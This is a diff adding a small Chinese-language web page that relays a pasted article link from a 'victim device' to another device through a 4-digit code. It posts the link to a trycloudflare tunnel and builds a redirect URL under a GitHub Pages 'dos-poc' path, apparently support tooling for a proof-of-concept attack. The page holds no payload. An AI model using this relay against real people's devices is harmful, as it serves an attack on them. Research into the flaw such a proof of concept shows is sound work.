@@ -1,0 +1,23 @@
+<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>transfer</title><style>body{font:16px/1.6 system-ui,sans-serif;margin:14px}#u{width:100%;height:46px;font-size:16px}
+button{font:16px/1.4 system-ui;padding:10px 14px;border-radius:8px;border:1px solid #888;background:#f0f0f0;margin-top:8px}
+code{word-break:break-all}#ta{position:fixed;left:-9999px}</style>
+<h3>文章链接传递</h3><p>在受害设备粘贴文章链接，生成 4 位码；另一台设备打开 r 页面输入这个码。</p>
+<input id="u" placeholder="长按粘贴文章链接（http/https）"><button id="g">生成 4 位码</button><div id="out"></div>
+<textarea id="ta"></textarea><script>
+var BASE='https://filed-ebony-accompanying-instruction.trycloudflare.com', REDIR='https://pepoc3.github.io/dos-poc/r/';
+function copy(t,b){function ok(){b.textContent='已复制';setTimeout(function(){b.textContent='复制链接';},1500);}
+function fb(){var ta=document.getElementById('ta');ta.value=t;ta.style.position='static';ta.style.left='0';ta.style.width='100%';ta.style.height='80px';ta.focus();ta.select();try{document.execCommand('copy');}catch(e){}ok();}
+if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(ok).catch(fb);}else{fb();}}
+document.getElementById('g').addEventListener('click',function(){
+ var u=document.getElementById('u').value.trim(), out=document.getElementById('out');
+ if(!/^https?:\/\//.test(u)){out.textContent='请先粘贴 http/https 链接';return;}
+ out.textContent='生成中...';
+ fetch(BASE+'/put?u='+encodeURIComponent(u)).then(function(r){return r.json();}).then(function(j){
+  if(!j.code){out.textContent='失败：'+JSON.stringify(j);return;}
+  var link=REDIR+'?c='+j.code;
+  out.innerHTML='<p>4 位码：<b style="font-size:34px;letter-spacing:4px">'+j.code+'</b></p><p>另一台设备打开：<br><code>'+link+'</code></p>';
+  var b=document.createElement('button');b.textContent='复制链接';b.addEventListener('click',function(){copy(link,b);});out.appendChild(b);
+ }).catch(function(e){out.textContent='请求失败：'+e;});
+});
+</script>
